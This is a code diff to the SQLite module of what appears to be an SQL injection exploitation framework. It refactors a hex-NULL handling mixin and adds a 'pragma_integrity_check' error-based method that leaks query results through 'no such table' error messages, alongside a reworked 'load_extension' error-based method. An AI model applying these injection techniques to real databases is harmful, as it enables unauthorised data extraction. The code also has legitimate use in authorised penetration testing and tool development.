@@ -15,6 +15,7 @@ from ending.util.typing import Any
 __all__ = [
     "Compiler",
     "SelectMethod",
+    "PragmaErrorMethod",
     "LoadExtensionMethod",
     "TestMethod",
     "BlobCellFetcher",
@@ -124,9 +125,13 @@ class Compiler(generic.Compiler):
         return Function["LENGTH"](length.node)
 
 
-# SQLite HEX(NULL) is not null but an empty string. To discriminate between the two,
-# we need to coalesce BEFORE we convert to hex, which changes a few things.
-class SelectMethod(generic.HexSelectMethod):
+class HexNullMixin:
+    """Mixin that fixes SQLite's HEX(NULL) = '' behaviour.
+
+    In SQLite, HEX(NULL) returns an empty string instead of NULL. To tell them apart,
+    nullable columns must be COALESCE'd with a sentinel tag before HEX is applied, and
+    the sentinel must be checked again during deserialization.
+    """
     tag_hex_null = generic.RandomTag()
 
     def serialize_cell(self, column: Node) -> Node:
@@ -160,6 +165,10 @@ class SelectMethod(generic.HexSelectMethod):
                 return super().deserialize_cell(column, cell)
 
 
+class SelectMethod(HexNullMixin, generic.SelectMethod):
+    pass
+
+
 class BlobCellFetcher(generic.BlobCellFetcher):
     __cache = {}
 
@@ -184,22 +193,44 @@ class TestMethod(generic.TestMethod):
         self.fetcher_blob = BlobCellFetcher(self)
 
 
-class LoadExtensionMethod(generic.ErrorBasedMethod):
-    """Uses the `load_extension()` SQLite method to retrieve data."""
-
-    size = 250
-    pattern = "stepping, /(.*).so:"
+class PragmaErrorMethod(HexNullMixin, generic.ErrorBasedMethod):
+    """Uses the `pragma_integrity_check()` table to retrieve data.
+    """
 
     def __init__(
         self,
         compiler: Compiler,
         inject: InjectForBytes,
+        **kwargs
+    ):
+        super().__init__(
+            compiler,
+            inject,
+            pattern=rb"no such table: /(.*)",
+            **kwargs
+        )
+
+    def build_payload(self, query: Query, position: int) -> Node:
+        payload = super().build_payload(query, position)
+        payload = Function["pragma_integrity_check"](Concatenation(("/", payload)))
+        payload = Query(payload).columns(Value(1))
+        return payload
+    
+class LoadExtensionMethod(HexNullMixin, generic.ErrorBasedMethod):
+    """Uses the `load_extension()` SQLite method to retrieve data."""
+
+    def __init__(
+        self,
+        compiler: Compiler,
+        inject: InjectForBytes,
+        **kwargs
     ):
         super().__init__(
             compiler,
             inject,
             size=250,
             pattern=rb"stepping, /.{,250}.so:",
+            **kwargs
         )
 
     def build_payload(self, query: Query, position: int) -> Node:
